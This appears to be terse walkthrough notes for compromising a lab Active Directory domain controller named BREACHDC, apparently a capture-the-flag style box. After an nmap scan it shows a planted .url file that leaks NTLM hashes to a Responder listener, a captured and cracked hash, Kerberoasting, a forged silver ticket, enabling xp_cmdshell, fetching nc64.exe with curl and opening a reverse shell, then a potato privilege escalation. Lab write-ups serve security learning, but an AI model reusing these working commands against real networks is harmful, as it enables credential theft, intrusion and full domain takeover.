53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 07:24:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-09T07:20:16
| Not valid after:  2027-02-08T07:20:16
| MD5:   ea07:777d:bdcf:45b8:73ca:39bb:c12d:c78c
|_SHA-1: f40d:d342:fee6:a748:069e:9a88:1cc4:6baf:1c1a:c2d6
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-10T07:25:34+00:00
|_ssl-date: 2026-08-10T07:26:14+00:00; -27s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50021/tcp open  msrpc         Microsoft Windows RPC

smb
/share
claire.pope                       
diana.pope                       
julia.wong                       

/users
Default                           DHR        0  Thu Feb 10 04:10:33 2022
desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
Public                             DR        0  Tue Sep 14 23:08:59 2021

can put files in transfer folder. uploaded evil.url  
evil.url
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\10.10.17.6\%USERNAME%.icon
IconIndex=1  
sudo responder -I tun0 -wv 
<img width="660" height="197" alt="image" src="https://github.com/user-attachments/assets/1a4d188e-0a5b-49a2-9419-3767ef6a3521" />
<img width="1908" height="117" alt="image" src="https://github.com/user-attachments/assets/79e105e5-6067-47e5-976c-b20e3da76482" />
JULIA.WONG::BREACH:553a370534e1c261:0b64a448d6ddf876626f971223ab083a:010100000000000080a6cc0b7c28dd0113e99763a9948c8900000000020008004c0036003900410001001e00570049004e002d0057004c0038004b00360053003500550054004d004e0004003400570049004e002d0057004c0038004b00360053003500550054004d004e002e004c003600390041002e004c004f00430041004c00030014004c003600390041002e004c004f00430041004c00050014004c003600390041002e004c004f00430041004c000700080080a6cc0b7c28dd0106000400020000000800300030000000000000000100000000200000c47289dad472d2999f0d6fb8fcdfd900160eadb3531f721984582c0dfcc628760a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310037002e0036000000000000000000:Computer1
julia.wong:Computer1  
in /share/transfer/julia.wong the user.txt is there  
<img width="927" height="517" alt="image" src="https://github.com/user-attachments/assets/6683e4f2-6695-408b-b4f4-46e46f4a66fb" />

cant login to evilwinrm but theres a svc_mssql  
<img width="1536" height="525" alt="image" src="https://github.com/user-attachments/assets/deb01cd8-38e7-4742-b884-fd82ff801ef2" />
netexec ldap $ip -u Julia.Wong -p Computer1 --kerberoast kerberoasting  
hashcat  
Trustno1  
mssqlclient.py breach.vl/svc_mssql:Trustno1@$ip -windows-auth  
spn of svc_mssql
<img width="740" height="716" alt="image" src="https://github.com/user-attachments/assets/a6bc81e2-0c95-4f2c-829f-42849d9d65fc" />
impacket-ticketer -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 -user-id 500 Administrator 
impacket-mssqlclient BREACHDC.breach.vl -k -no-pass
<img width="684" height="226" alt="image" src="https://github.com/user-attachments/assets/6fe6d4f3-9c9c-4d4e-9669-2320df35d604" />  
-- Enable advanced options and xp_cmdshell as sysadmin
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;


curl http://192.168.45.184/nc64.exe -o C:\Windows\Temp\nc64.exe
C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.17.6 443  
<img width="1386" height="246" alt="image" src="https://github.com/user-attachments/assets/a14c3f60-9986-4e5b-bb0b-679f1bc5e7e7" />

whoami /priv has se impersonate. SIGMAPOTATO  
<img width="868" height="448" alt="image" src="https://github.com/user-attachments/assets/bff0eff0-24d2-4e13-bee5-4009b3bcb500" />
<img width="1424" height="213" alt="image" src="https://github.com/user-attachments/assets/776e82fc-821b-412c-8d94-d38440e0cc28" />

